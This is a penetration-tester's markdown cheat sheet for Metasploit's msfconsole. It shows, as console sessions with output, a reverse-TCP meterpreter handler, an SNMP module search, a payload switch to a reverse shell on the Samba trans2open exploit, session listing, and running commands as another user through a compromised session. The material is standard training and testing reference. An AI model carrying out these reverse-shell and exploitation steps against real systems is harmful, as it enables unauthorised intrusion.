---
tags: [shell,snmp]
---
# msfconsole

## References

`msfconsole` is the command line (CLI) interpreter of metasploit framework (msf).

- Basic: https://www.offensive-security.com/metasploit-unleashed/msfconsole/
- https://inventory.raw.pm/tools.html#Metasploit

## Handler

Basic attached multi handler:

```
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.11.0.204
LHOST => 10.11.0.204
msf5 exploit(multi/handler) > set LPORT 57896
LPORT => 57896
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.0.204:57896
```

## Example of SNMP modules

```
msf >  search snmp

Matching Modules
================

   Name                                               Disclosure Date  Rank    Description
   ----                                               ---------------  ----    -----------
   auxiliary/scanner/misc/oki_scanner                                  normal  OKI Printer Default Login Credential Scanner
   auxiliary/scanner/snmp/aix_version                                  normal  AIX SNMP Scanner Auxiliary Module
   auxiliary/scanner/snmp/cisco_config_tftp                            normal  Cisco IOS SNMP Configuration Grabber (TFTP)
   auxiliary/scanner/snmp/cisco_upload_file                            normal  Cisco IOS SNMP File Upload (TFTP)
   auxiliary/scanner/snmp/snmp_enum                                    normal  SNMP Enumeration Module
   auxiliary/scanner/snmp/snmp_enumshares                              normal  SNMP Windows SMB Share Enumeration
   auxiliary/scanner/snmp/snmp_enumusers                               normal  SNMP Windows Username Enumeration
   auxiliary/scanner/snmp/snmp_login                                   normal  SNMP Community Scanner
   auxiliary/scanner/snmp/snmp_set                                     normal  SNMP Set Module
   auxiliary/scanner/snmp/xerox_workcentre_enumusers                   normal  Xerox WorkCentre User Enumeration (SNMP)
   exploit/windows/ftp/oracle9i_xdb_ftp_unlock        2003-08-18       great   Oracle 9i XDB FTP UNLOCK Overflow (win32)
   exploit/windows/http/hp_nnm_ovwebsnmpsrv_main      2010-06-16       great   HP OpenView Network Node Manager ovwebsnmpsrv.exe main Buffer Overflow
   exploit/windows/http/hp_nnm_ovwebsnmpsrv_ovutil    2010-06-16       great   HP OpenView Network Node Manager ovwebsnmpsrv.exe ovutil Buffer Overflow
   exploit/windows/http/hp_nnm_ovwebsnmpsrv_uro       2010-06-08       great   HP OpenView Network Node Manager ovwebsnmpsrv.exe Unrecognized Option Buffer Overflow
   exploit/windows/http/hp_nnm_snmp                   2009-12-09       great   HP OpenView Network Node Manager Snmp.exe CGI Buffer Overflow
   exploit/windows/http/hp_nnm_snmpviewer_actapp      2010-05-11       great   HP OpenView Network Node Manager snmpviewer.exe Buffer Overflow
   post/windows/gather/enum_snmp  
```

## Change of payload

```
msf5 exploit(linux/samba/trans2open) > show payloads 

Compatible Payloads
===================

   #   Name                                      Disclosure Date  Rank    Check  Description
   -   ----                                      ---------------  ----    -----  -----------
   1   generic/custom                                             normal  No     Custom Payload
   2   generic/debug_trap                                         normal  No     Generic x86 Debug Trap
   3   generic/shell_bind_tcp                                     normal  No     Generic Command Shell, Bind TCP Inline
   4   generic/shell_reverse_tcp                                  normal  No     Generic Command Shell, Reverse TCP Inline
   5   generic/tight_loop                                         normal  No     Generic x86 Tight Loop
   6   linux/x86/adduser                                          normal  No     Linux Add User
   7   linux/x86/chmod                                            normal  No     Linux Chmod
   8   linux/x86/exec                                             normal  No     Linux Execute Command
   9   linux/x86/meterpreter/bind_ipv6_tcp                        normal  No     Linux Mettle x86, Bind IPv6 TCP Stager (Linux x86)
   10  linux/x86/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Linux Mettle x86, Bind IPv6 TCP Stager with UUID Support (Linux x86)
   11  linux/x86/meterpreter/bind_nonx_tcp                        normal  No     Linux Mettle x86, Bind TCP Stager
   12  linux/x86/meterpreter/bind_tcp                             normal  No     Linux Mettle x86, Bind TCP Stager (Linux x86)
   13  linux/x86/meterpreter/bind_tcp_uuid                        normal  No     Linux Mettle x86, Bind TCP Stager with UUID Support (Linux x86)
   14  linux/x86/meterpreter/reverse_ipv6_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager (IPv6)
   15  linux/x86/meterpreter/reverse_nonx_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager
   16  linux/x86/meterpreter/reverse_tcp                          normal  No     Linux Mettle x86, Reverse TCP Stager
   17  linux/x86/meterpreter/reverse_tcp_uuid                     normal  No     Linux Mettle x86, Reverse TCP Stager
   18  linux/x86/metsvc_bind_tcp                                  normal  No     Linux Meterpreter Service, Bind TCP
   19  linux/x86/metsvc_reverse_tcp                               normal  No     Linux Meterpreter Service, Reverse TCP Inline
   20  linux/x86/read_file                                        normal  No     Linux Read File
   21  linux/x86/shell/bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind IPv6 TCP Stager (Linux x86)
   22  linux/x86/shell/bind_ipv6_tcp_uuid                         normal  No     Linux Command Shell, Bind IPv6 TCP Stager with UUID Support (Linux x86)
   23  linux/x86/shell/bind_nonx_tcp                              normal  No     Linux Command Shell, Bind TCP Stager
   24  linux/x86/shell/bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Stager (Linux x86)
   25  linux/x86/shell/bind_tcp_uuid                              normal  No     Linux Command Shell, Bind TCP Stager with UUID Support (Linux x86)
   26  linux/x86/shell/reverse_ipv6_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager (IPv6)
   27  linux/x86/shell/reverse_nonx_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager
   28  linux/x86/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
   29  linux/x86/shell/reverse_tcp_uuid                           normal  No     Linux Command Shell, Reverse TCP Stager
   30  linux/x86/shell_bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind TCP Inline (IPv6)
   31  linux/x86/shell_bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Inline
   32  linux/x86/shell_bind_tcp_random_port                       normal  No     Linux Command Shell, Bind TCP Random Port Inline
   33  linux/x86/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
   34  linux/x86/shell_reverse_tcp_ipv6                           normal  No     Linux Command Shell, Reverse TCP Inline (IPv6)

msf5 exploit(linux/samba/trans2open) > set payload generic/shell_reverse_tcp 
payload => generic/shell_reverse_tcp
msf5 exploit(linux/samba/trans2open) > show options 

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.0.0.1         yes       The target address range or CIDR identifier
   RPORT   139              yes       The target port (TCP)


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.0.254       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce
```

## List sessions

```
sessions -l

Active sessions
===============

  Id  Name  Type                     Information                Connection
  --  ----  ----                     -----------                ----------
  3         meterpreter x86/windows  hosname\user @ netbios  10.0.0.254:57896 -> 10.0.0.1:50994 (10.0.0.1)
```

## Run a command as another user on Windows

```
msf5 exploit(multi/handler) > use post/windows/manage/run_as
msf5 post(windows/manage/run_as) > set CMD whoami
CMD => whoami
msf5 post(windows/manage/run_as) > set CMDOUT true
CMDOUT => true
msf5 post(windows/manage/run_as) > set PASSWORD mypwd
PASSWORD => mypwd
msf5 post(windows/manage/run_as) > set USER alice
USER => alice
msf5 post(windows/manage/run_as) > set SESSION 3
SESSION => 3
msf5 post(windows/manage/run_as) > set DOMAIN .
DOMAIN => .
msf5 post(windows/manage/run_as) > run

[*] Executing CreateProcessWithLogonW...
[+] Process started successfully, PID: 4388
[*] Command Run: cmd.exe /c whoami > C:\Windows\Temp\NuhelUOR.txt
[*] Command output:
hostname\alice

[*] Removing temp file C:\Windows\Temp\NuhelUOR.txt
[*] Post module execution completed
```
